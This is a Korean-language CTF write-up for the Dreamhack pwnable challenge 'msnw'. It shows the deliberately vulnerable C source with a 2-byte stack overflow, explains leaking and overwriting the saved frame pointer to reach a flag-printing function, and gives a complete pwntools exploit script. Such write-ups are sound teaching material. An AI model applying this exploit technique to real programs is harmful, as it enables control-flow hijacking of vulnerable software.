---
title: "[Dreamhack] PWN msnw"
date: 2023-02-07T15:30:00+09:00
url: /2023/02/07/dreamhack-msnw/
tags: [Dreamhack, pwnable, wargame, writeup]
summary: "드림핵 포너블 msnw 문제풀이"
math: true
---
드림핵 크리스마스 CTF에 출제된 포너블 문제다. 전체적인 환경에 대한 정보는 따로 주어지지 않았고, 바이너리, 소스코드, 더미 플레그가 제공되었다.

우선 먼저 코드를 살펴보자.

```c
/* msnw.c
 * gcc -no-pie -fno-stack-protector -mpreferred-stack-boundary=8 msnw.c -o msnw
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define MEONG 0
#define NYANG 1

#define NOT_QUIT 1
#define QUIT 0

void Init() {
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stderr, 0, _IONBF, 0);
}

int Meong() {
    char buf[0x40];

    memset(buf, 0x00, 0x130);

    printf("meong 🐶: ");
    read(0, buf, 0x132);

    if (buf[0] == 'q')
        return QUIT;
    return NOT_QUIT;
}

int Nyang() {
    char buf[0x40];

    printf("nyang 🐱: ");
    printf("%s", buf);

    return NOT_QUIT;
}

int Call(int animal) {
    return animal == MEONG ? Meong() : Nyang();
}

void Echo() {
    while (Call(MEONG)) Call(NYANG);
}

void Win() {
    execl("/bin/cat", "/bin/cat", "./flag", NULL);
}

int main(void) {
    Init();

    Echo();
    puts("nyang 🐱: goodbye!");

    return 0;
}
```

코드를 살펴보면 Meong() 함수에서 2바이트 오버플로우가 가능한 것을 알수 있다. 따라서 SFP 변조를 통해 코드의 실행 흐름일 바꿀 수 있을것 같다. Win 함수가 실행되면 flag가 출력되는것 같다.

우선 Meong() 함수에서 \n포함 0x130 길이의 문자열을 입력하면 이 값을 그대로  Nyang()함수에서 사용하기 때문에 printf를 통해 SFP 하위 2자리 값을 얻을 수 있다.

버퍼의 크기는 0x130이고 이를 0x10으로 나누면 13이니 버퍼에 Win 함수 값으로 덮어버렸다. 그렇게 되면 그냥 버퍼에 존재하는 값만 잘 맞춰서 sfp를 조작하면 Win함수로 갈수 있다. 우선 SFP 값을 릭해서 나온 값으로 gdb를 통해 buf 문자열이 포함되는 위치를 찾는다. 버퍼에는 Win 함수 주소값이 연속적으로 들어있어 어느 직점을 찍던 맨 뒷자리가 0 아님 8로 끝나면 코드는 성공한다. 나는 buf의 맨 처음 지점을 계산해 -8을 계산해 sfp를 오버라이트 했다. sfp 공격은 공격자가 입력한 값 +8 의 위치한 코드를 실행하기 때문에 이런 점만 맞춰주면 Win 함수를 실행할 수 있다. (32비트는 +4한 부분을 실행한다. 메모리 사이즈에 따라 64비트는 8, 32비트는 4 만큼의 차이가 있다.)


```python
from pwn import *
context.update(arch='amd64', os='linux')
#c = remote("host3.dreamhack.games", 17108);
c = process("./msnw")
#libc = ELF("./libc.so.6")
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

execFlag = 0x40135b
payload = p64(execFlag)
while(len(payload)!=0x130):
    payload = payload+p64(execFlag)

c.recvuntil("meong 🐶: ")
pause()
c.sendline("a"*0x12f)

#print(payload)

c.recvuntil(b"\n")
leak1 = c.recv(2)
leak2 = leak1+b"\x00\x00\x00\x00\x00\x00"
print("leak : "+str(hex(u64(leak2))))
print("leak : "+str(leak2))
c.recvuntil(": ")

leak = int(hex(u64(leak2)), 16)-0x200-0x130
print(hex(leak))

#payload += b"a"*(0x130-len(p64(execFlag)))
#rsp 0x7fffffffde00
payload = payload + p64(leak-0x8)[:-6]
print(payload)
c.sendline(payload)
pause()
print(c.recvall())
```